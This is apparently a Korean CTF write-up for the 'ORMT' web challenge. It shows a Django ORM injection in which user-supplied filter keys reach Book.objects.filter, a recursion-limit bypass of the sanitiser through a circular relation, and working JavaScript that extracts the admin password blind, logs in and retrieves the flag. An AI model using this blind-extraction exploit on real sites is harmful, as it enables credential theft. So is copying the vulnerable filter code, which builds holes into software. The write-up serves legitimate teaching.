---
ctf_name: "2026-CyberGame"
challenge_name: "ORMT"
category: "web"
difficulty: "medium"
author: "yeahhbean"
date: "2026-04-05"
points: 100
tags: [django, orm-injection, blind-injection, relation-traversal]
---

# ORMT

## 문제 설명

> A local bookstore has deployed a new online library system. The application lets users browse books, view details, and search the catalogue using a custom lookup feature. We have been retained to perform a security assessment of the application. Your objective is to gain access to the admin area and retrieve the flag.

- **URL**: http://exp.cybergame.sk:7001
- `/book_lookup` — 책 검색 기능 (POST)
- `/admin` — HTTP Basic Auth로 보호된 관리자 페이지

## 풀이

### 분석

Network 탭에서 `/book_lookup`이 POST 요청을 사용하며, 파라미터 이름이 `title__icontains`인 것을 확인. Django ORM의 lookup 문법(`__icontains`)이 그대로 파라미터 이름으로 사용되고 있다.

서버 응답 헤더에서 `WSGIServer/0.2 CPython/3.12.12` 확인 → Python/Django 백엔드 확정.

소스코드를 분석한 결과, `views.py`의 `book_lookup()`이 POST 파라미터를 그대로 `Book.objects.filter(**filters)`에 전달하는 구조임을 파악했다.

```python
# views.py
def book_lookup(request):
    filters = {}
    for filter in request.POST:
        if request.POST[filter] == '':
            continue
        try:
            filters[clean(filter)] = request.POST[filter]
        except:
            filters[filter] = request.POST[filter]  # 원본 키가 그대로 사용됨
    finds = Book.objects.filter(**filters)
```

모델 구조 (`models.py`):

```
Book ──(reviews)──▶ Review ──(for_book)──▶ Book  ← 순환!
                      └──(by_user)──▶ SiteUser
```

`/admin`은 커스텀 뷰로, `SiteUser` 테이블의 `role="admin"` 계정으로 HTTP Basic Auth 인증 시 flag를 반환한다. `SiteUser.password`는 평문으로 저장되어 있다.

### 취약점

**1. Django ORM Injection**

POST 파라미터 이름이 ORM filter 키로 직접 사용되므로, 임의의 관계/필드를 조건으로 주입할 수 있다.

**2. `clean()` 우회 — RecursionError**

방어 코드인 `clean()`은 `__`를 재귀적으로 제거하지만, `depth == 25`에서 `RecursionError`가 발생하면 `except` 블록에서 원본 키가 그대로 filter에 들어간다.

```python
def clean(filter, depth=0):
    if depth == 25:
        raise RecursionError
    if filter.find('__') != -1:
        return clean(filter.replace('__', '_', 1), depth+1)
    return filter.replace('_', '__', 1)
```

`__`가 23개 이상 포함된 키를 전송하면 RecursionError가 발생하고, 원본 키가 ORM에 그대로 전달된다.

**3. 순환 관계 Traversal**

`Book → Review(reviews) → Book(for_book) → ...`를 반복하면 `__`를 원하는 만큼 늘릴 수 있다. 이를 이용해 `clean()`을 우회하면서 마지막에 `by_user__password__startswith` 조건을 붙인다.

### 익스플로잇

**Step 1 — Blind Oracle 구성**

`/details?id=2` (`The Rust Programming Language`)의 리뷰 작성자가 `Admin`임을 확인. 이 책의 존재 여부를 참/거짓 판단 기준으로 사용한다.

```javascript
async function oracle(condition) {
  const r = await fetch("/book_lookup", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: "title_icontains=Rust&" + condition,
  });
  const d = await r.text();
  return (d.match(/book_card/g) || []).length === 1;
}
```

**Step 2 — Admin 비밀번호 Blind 추출**

`reviews__for_book__`을 12번 반복해 `__`를 24개 만들어 RecursionError를 유발한다.

```javascript
async function extractPassword() {
  const CHAIN = "reviews__for_book__".repeat(12);
  const field = CHAIN + "reviews__by_user__password__startswith";
  let password = "";
  const chars =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*_-";

  for (let i = 0; i < 60; i++) {
    let found = false;
    for (const c of chars) {
      if (await oracle(`${field}=${encodeURIComponent(password + c)}`)) {
        password += c;
        console.log("현재:", password);
        found = true;
        break;
      }
    }
    if (!found) {
      console.log("완료:", password);
      break;
    }
  }
}

extractPassword();
// 결과: IiaG2RUTCac2EtHXVz9p4A8Opr5k90Uf
```

**Step 3 — `/admin` 인증**

```javascript
fetch("/admin", {
  headers: {
    Authorization: "Basic " + btoa("Admin:IiaG2RUTCac2EtHXVz9p4A8Opr5k90Uf"),
  },
})
  .then((r) => r.text())
  .then(console.log);
```

## 플래그

```
SK-CERT{0rm_r3l4t10n_tr4v3rs4l_g0t_y0u}
```

## 배운 점

- Django ORM filter에 사용자 입력 키를 그대로 사용하면 relation traversal을 통한 임의 테이블 접근이 가능하다.
- 방어 코드의 재귀 깊이 제한은 오히려 `except` 블록을 통한 우회 경로가 된다.
- 순환 FK 관계(`Book → Review → Book`)를 반복하면 `__`를 원하는 만큼 늘려 깊이 제한을 우회할 수 있다.
- Blind Boolean Injection은 결과 개수(0 vs 1)만으로도 문자열을 한 글자씩 추출할 수 있다.
